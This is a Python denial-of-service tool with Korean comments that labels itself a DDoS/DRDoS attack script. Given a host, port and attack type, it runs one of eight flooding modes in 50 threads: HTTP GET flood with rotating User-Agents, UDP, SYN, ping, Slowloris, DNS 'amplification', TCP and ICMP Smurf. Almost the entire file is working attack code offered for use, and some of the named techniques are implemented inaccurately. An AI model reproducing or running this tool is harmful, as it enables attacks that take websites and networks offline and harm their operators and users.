import socket
import threading
import random
import time
import sys
from rich.console import Console

# 콘솔 객체 초기화
console = Console()

# User-Agent 목록
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/99.0.1150.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
    "Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
    "Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
    "Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
    "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
    "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
    "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36"
    "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/47.1.79 like Chrome/47.0.2526.80 Safari/537.36",
    "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36",
    "Roku4640X/DVP-7.70 (297.70E04154A)",
    "Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    "Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
    "AppleTV6,2/11.1",
    "AppleTV5,3/9.1.1",
    "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",
    "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
    "Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2",
    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
]


"""DDos 공격 스크립트"""
# HTTP GET Flood 공격 함수
def http_flood(host, port, thread_id):
    while True:
        try:
            # 각 요청마다 새 소켓 생성
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            
            # 랜덤 User-Agent로 GET 요청 생성
            user_agent = random.choice(user_agents)
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml\r\n\r\n"
            
            # 요청 전송
            s.send(request.encode())
            console.print(f"[green][Thread {thread_id}][/green] 패킷 전송됨: {host}")
            
            # 소켓 종료
            s.shutdown(socket.SHUT_RDWR)
            s.close()
            
            # CPU 과부하 방지를 위한 짧은 딜레이
            time.sleep(0.1)
            
        except socket.error as e:
            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
            time.sleep(1)  # 오류 발생 시 더 긴 대기 시간
            continue
        except Exception as e:
            console.print(f"[red][Thread {thread_id}][/red] 예상치 못한 오류: {e}")
            break

# UDP Flood 공격 함수
def udp_flood(host, port, thread_id):
    while True:
        try:
            # 각 요청마다 새 소켓 생성
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # 랜덤 데이터 패킷 생성
            message = random._urandom(1024)
            
            # 패킷 전송
            s.sendto(message, (host, int(port)))
            console.print(f"[green][Thread {thread_id}][/green] UDP 패킷 전송됨: {host}:{port}")
            
            # CPU 과부하 방지를 위한 짧은 딜레이
            time.sleep(0.1)
            
        except socket.error as e:
            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
            time.sleep(1)  # 오류 발생 시 더 긴 대기 시간
            continue
        except Exception as e:
            console.print(f"[red][Thread {thread_id}][/red] 예상치 못한 오류: {e}")
            break

# SYN Flood 공격 함수
def syn_flood(host, port, thread_id):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            s.connect_ex((host, int(port)))
            console.print(f"[green][Thread {thread_id}][/green] SYN 패킷 전송됨: {host}:{port}")
            s.close()
            time.sleep(0.1)
        except Exception as e:
            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
            time.sleep(1)
            continue

# Ping Flood 공격 함수 (ICMP Echo 요청)
def ping_flood(host, port, thread_id):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            pkt = b'\x08\x00\xf7\xff' + b'\x00'*4  # 간단한 ICMP Echo 패킷
            s.sendto(pkt, (host, 1))
            console.print(f"[green][Thread {thread_id}][/green] Ping 패킷 전송됨: {host}")
            s.close()
            time.sleep(0.1)
        except Exception as e:
            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
            time.sleep(1)
            continue

# Slowloris 공격 함수
def slowloris(host, port, thread_id):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        request = f"GET / HTTP/1.1\r\nHost: {host}\r\n"
        s.send(request.encode())
        while True:
            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            console.print(f"[green][Thread {thread_id}][/green] Slowloris 패킷 전송 중: {host}:{port}")
            time.sleep(15)
    except Exception as e:
        console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")


"""DRDos 공격 스크립트"""
# DNS Amplification 공격 함수
def udp_dns_amplification(host, port, thread_id):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # 간단한 DNS ANY 쿼리 (example.com)
            dns_query = (b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                         b'\x07example\x03com\x00\x00\xff\x00\x01')
            s.sendto(dns_query, (host, int(port)))
            console.print(f"[green][Thread {thread_id}][/green] DNS Amplification 패킷 전송됨: {host}:{port}")
            time.sleep(0.1)
        except Exception as e:
            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
            time.sleep(1)
            continue


# TCP 기반 DRDos 공격 함수
def tcp_drdos(host, port, thread_id):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            dummy_data = (f"GET / HTTP/1.1\r\n"
                          f"Host: {host}\r\n"
                          "User-Agent: DRDosTCP\r\n"
                          "Connection: keep-alive\r\n\r\n").encode()
            s.send(dummy_data)
            console.print(f"[green][Thread {thread_id}][/green] TCP 패킷 전송됨: {host}:{port}")
            time.sleep(0.1)
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except Exception as e:
            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
            time.sleep(1)
            continue

# ICMP 기반 DRDos-Smurf 공격 함수
def icmp_smurf(host, port, thread_id):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            # ICMP Echo 요청 패킷 (type=8, code=0)
            packet = b'\x08\x00\xf7\xff' + b'\x00' * 4
            s.sendto(packet, (host, 0))
            console.print(f"[green][Thread {thread_id}][/green] Smurf 패킷 전송됨: {host}")
            time.sleep(0.1)
        except Exception as e:
            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
            time.sleep(1)
            continue

# 메인 함수
def main():
    if len(sys.argv) != 4:
        console.print("[red]사용법: python main.py <host> <port> <attack_type>[/red]")
        console.print("[red]attack_type: http, udp, syn, ping, slowloris, dns, tcp, smurf[/red]")
        sys.exit(1)
        
    host = sys.argv[1]
    port = sys.argv[2]
    attack_type = sys.argv[3].lower()
    
    # 대상 연결 가능 여부 확인 (HTTP 기반 연결만 확인)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.close()
    except socket.error:
        console.print(f"[red]오류: {host}:{port}에 연결할 수 없습니다[/red]")
        sys.exit(1)
    
    # 스레드 수
    thread_count = 50
    
    if attack_type == "http":
        console.print(f"[yellow]{host}:{port}에 대한 HTTP GET flood 공격 시작 (스레드 {thread_count}개)[/yellow]")
        attack_function = http_flood
    elif attack_type == "udp":
        console.print(f"[yellow]{host}:{port}에 대한 UDP flood 공격 시작 (스레드 {thread_count}개)[/yellow]")
        attack_function = udp_flood
    elif attack_type == "syn":
        console.print(f"[yellow]{host}:{port}에 대한 SYN flood 공격 시작 (스레드 {thread_count}개)[/yellow]")
        attack_function = syn_flood
    elif attack_type == "ping":
        console.print(f"[yellow]{host}:{port}에 대한 Ping flood 공격 시작 (스레드 {thread_count}개)[/yellow]")
        attack_function = ping_flood
    elif attack_type == "slowloris":
        console.print(f"[yellow]{host}:{port}에 대한 Slowloris 공격 시작 (스레드 {thread_count}개)[/yellow]")
        attack_function = slowloris
    elif attack_type == "dns":
        console.print(f"[yellow]{host}:{port}에 대한 DNS Amplification 공격 시작 (스레드 {thread_count}개)[/yellow]")
        attack_function = udp_dns_amplification
    elif attack_type == "tcp":
        console.print(f"[yellow]{host}:{port}에 대한 TCP 기반 DRDos 공격 시작 (스레드 {thread_count}개)[/yellow]")
        attack_function = tcp_drdos
    elif attack_type == "smurf":
        console.print(f"[yellow]{host}:{port}에 대한 ICMP Smurf 공격 시작 (스레드 {thread_count}개)[/yellow]")
        attack_function = icmp_smurf
    else:
        console.print("[red]유효하지 않은 attack_type입니다. http, udp, syn, ping, slowloris, dns, tcp, smurf 중 하나를 선택하세요.[/red]")
        sys.exit(1)
    
    # 스레드 생성 및 시작
    for i in range(thread_count):
        t = threading.Thread(target=attack_function, args=(host, port, i))
        t.daemon = True
        t.start()
        console.print(f"[blue]스레드 {i} 시작됨[/blue]")
    
    # 메인 스레드 유지
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("[yellow]사용자에 의해 공격이 중지되었습니다[/yellow]")
        sys.exit(0)

if __name__ == "__main__":
    main()